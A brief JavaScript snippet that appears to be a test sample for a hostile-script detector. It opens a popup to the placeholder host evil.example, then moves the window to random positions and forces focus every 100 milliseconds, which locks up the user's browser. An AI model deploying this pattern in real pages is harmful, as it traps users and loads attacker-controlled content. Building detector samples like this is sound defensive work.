// Tight popup lockup: open, move, focus, screen read and timer all driven
// from one small loop. Must still convict after the proximity bound.
var w = window.open("http://evil.example/p", "x", "width=200,height=200");
setInterval(function(){window.moveTo(Math.random()*800,Math.random()*600);window.focus();var a=window.screen.height;},100);
setTimeout(function(){},5000);
